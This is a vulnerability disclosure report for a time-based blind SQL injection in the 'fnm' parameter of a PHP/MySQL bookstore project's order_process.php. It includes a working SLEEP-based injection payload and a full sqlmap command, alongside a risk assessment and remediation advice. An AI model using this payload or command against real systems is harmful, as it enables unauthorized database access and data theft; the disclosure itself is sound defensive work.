# Bookstore Management System (PHP & MySQL) – SQL Injection Vulnerability

## 1. Overview

| **Item**            | **Details**                                                                                                       |
|---------------------|-------------------------------------------------------------------------------------------------------------------|
| **Project**         | Bookstore Management System (PHP & MySQL)                                                                         |  
| **Version**         | V1.0                                                                                                              |
| **Vulnerable File** | `/order_process.php`                                                                                              |
| **Vulnerability**   | SQL Injection                                                                                                     |
| **Root Cause**      | Direct usage of unvalidated input (`fnm` parameter) in SQL queries leads to malicious code injection.             |
| **Impact**          | Unauthorized DB access, data leakage, data tampering, potential system control, and service interruption.         |
| **Submitter**       | writerke                                                                                                          |
| **Vendor Site**     | [Homepage](https://1000projects.org/bookstore-management-system-php-mysql-project.html)                           |
| **Download Link**   | [Bookstore Management System](https://1000projects.org/wp-content/uploads/2023/01/Bookstore-Management-System.7z) |

---

## 2. Vulnerability Description

A critical SQL injection flaw was identified in the `/order_process.php` file of the **Bookstore Management System PHP MySQL Project**. Attackers can exploit the `fnm` parameter by injecting malicious SQL commands directly into database queries, bypassing required sanitation or validation. This allows unauthorized access to the underlying database, leading to:

- **Sensitive data theft**
- **Modification or deletion of critical information**
- **Escalation to full system compromise**

No authentication is required to exploit this vulnerability, significantly elevating the risk.

---

## 3. Technical Analysis

### 3.1 Payload & PoC

- **Vulnerable Parameter**: `fnm` (POST)
- **Vulnerability Type**: Time-Based Blind SQL Injection

<details>
<summary>Example Payload</summary>

```makefile
fnm=Hacker0xOne Blue' (SELECT 0x507a6e6b WHERE 9832=9832 AND (SELECT 7424 FROM (SELECT(SLEEP(5)))OdmC)) '
&add=1066 Front St
&pc=03102
&city=Manchester
&state=Select an option%E2%80%A6
&mno=17849382736
&sub=
```
</details>

<details>
<summary>sqlmap Test Command</summary>

```bash
sqlmap -u "localhost:9090/order_process.php" \
       --data="fnm=Hacker0xOne+Blue&add=1066+Front+St&pc=03102&city=Manchester&state=Select+an+option%E2%80%A6&mno=17849382736&sub=" \
       --batch --level=5 --risk=3 --random-agent \
       --tamper=space2comment --dbms=mysql --dbs
```
</details>

**Note**: The SQL injection succeeds if the application delays or processes unexpected queries, as shown in the attached testing screenshot:


<img width="1699" alt="image" src="https://github.com/user-attachments/assets/9db43879-a664-4500-9789-cce429a2a9b8" />



---

## 4. Risk Assessment

| **Risk Category**  | **Description**                                                                              |
|--------------------|----------------------------------------------------------------------------------------------|
| **Confidentiality**| Attackers could extract sensitive data from the database.                                    |
| **Integrity**      | Possibility of data tampering, unauthorized modifications, or deletions.                     |
| **Availability**   | Malicious queries or data corruption could lead to service interruptions or downtime.        |
| **Overall Severity** | **High** – Requires immediate attention due to ease of exploitation (no login needed).      |

---

## 5. Recommended Fixes

1. **Use Prepared Statements / Parameter Binding**  
   - Implement parameterized queries to avoid mixing user inputs with SQL logic.  

2. **Enforce Input Validation**  
   - Reject or sanitize suspicious inputs. Ensure the `fnm` field adheres to a defined format (e.g., no special characters).

3. **Restrict Database Privileges**  
   - Assign minimal privileges to the database user. Avoid using administrative accounts for standard operations.

4. **Conduct Regular Security Reviews**  
   - Periodically audit code and infrastructure to detect vulnerabilities early.  
   - Employ automated scanners and manual penetration testing for comprehensive coverage.

---

## 6. Additional Notes

- **Immediate Action**: Prompt patching is advised to mitigate ongoing risks.
- **Long-Term Plan**: Incorporate secure coding practices (e.g., input validation libraries, WAF deployment) to prevent similar issues.
- **Reference**: [Bookstore Management System Project](https://1000projects.org/bookstore-management-system-php-mysql-project.html)

---

**Disclaimer**:  
This report is intended solely for responsible disclosure to the impacted vendor or authorized party. Any unauthorized use or sharing of these findings is prohibited and may lead to legal consequences.
